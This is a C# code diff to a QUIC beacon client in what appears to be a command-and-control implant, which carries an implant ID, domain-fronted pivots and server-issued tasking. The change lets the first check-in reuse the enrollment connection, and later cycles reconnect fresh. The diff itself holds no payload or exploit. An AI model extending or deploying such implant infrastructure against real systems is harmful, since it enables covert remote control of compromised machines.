@@ -40,7 +40,12 @@ internal static class QuicCheckIn
         setup.Log,
         setup.Nonces,
         setup.Cadence,
-        setup.Held);
+        setup.Held,
+        // The QUIC enroll exchange's live connection (architecture.md Sec 8,
+        // enrollment over QUIC): the first cycle rides it -- the ordinary
+        // handshake follows the enroll on the same stream, one connection
+        // carrying enroll-then-session -- and every later cycle dials fresh.
+        setup.EnrollConnection as QuicWire);
 }
 
 /// <summary>
@@ -74,6 +79,7 @@ internal sealed class QuicBeacon : ICheckInClient
     private readonly FrontedPivots? _fronted;
     private readonly TaskNonceTracker _nonces;
     private readonly HeldTaskLedger _held;
+    private QuicWire? _firstWire;
 
     // The shared task-acceptance pipeline (fronting gate, verification,
     // dedup, staged/channel/inline shapes) over this client's per-run state.
@@ -91,7 +97,8 @@ internal sealed class QuicBeacon : ICheckInClient
         TextWriter log,
         TaskNonceTracker? nonces = null,
         Cadence? cadence = null,
-        HeldTaskLedger? held = null)
+        HeldTaskLedger? held = null,
+        QuicWire? firstWire = null)
     {
         _egress = egress;
         _implantId = implantId;
@@ -109,6 +116,7 @@ internal sealed class QuicBeacon : ICheckInClient
         _log = log;
         _nonces = nonces ?? new TaskNonceTracker();
         _held = held ?? new HeldTaskLedger();
+        _firstWire = firstWire;
         _tasking = new BeaconTasking(_implantId, _cas, _fronted, _nonces, _held, _handlers, _log);
     }
 
@@ -191,14 +199,16 @@ internal sealed class QuicBeacon : ICheckInClient
         return CheckInExit.Terminate;
     }
 
-    // One connection: dial, handshake, then hold the session until the
-    // server closes, the connection drops, or cancellation fires. Throws on
-    // transport errors (the caller logs and reconnects); a refused handshake
-    // returns Terminal.
+    // One connection: dial (or take the enroll exchange's handoff wire, the
+    // one connection that carries enroll-then-session), handshake, then hold
+    // the session until the server closes, the connection drops, or
+    // cancellation fires. Throws on transport errors (the caller logs and
+    // reconnects); a refused handshake returns Terminal.
     private async Task<BeaconCycleResult> RunOnceAsync(CancellationToken cancellationToken)
     {
-        await using var wire = await QuicWire.ConnectAsync(_egress.CurrentBeaconUrl, _pinned, cancellationToken)
-            .ConfigureAwait(false);
+        await using var wire = TakeFirstWire()
+            ?? await QuicWire.ConnectAsync(_egress.CurrentBeaconUrl, _pinned, cancellationToken)
+                .ConfigureAwait(false);
 
         // The implant speaks first: the handshake frame -- re-opens (or
         // reuses) the session and re-advertises the baked class verbs
@@ -296,6 +306,10 @@ internal sealed class QuicBeacon : ICheckInClient
             await Task.WhenAll(liveChannels.Values.Select(c => c.Delivery));
         }
     }
+
+    // Claims the enroll exchange's handoff wire exactly once: the first
+    // cycle after a QUIC enroll rides it, every reconnect dials fresh.
+    private QuicWire? TakeFirstWire() => Interlocked.Exchange(ref _firstWire, null);
 
     // Opens a channel for a dispatched streaming task and starts its handler
     // in the background: the loop returns to reading immediately, the channel
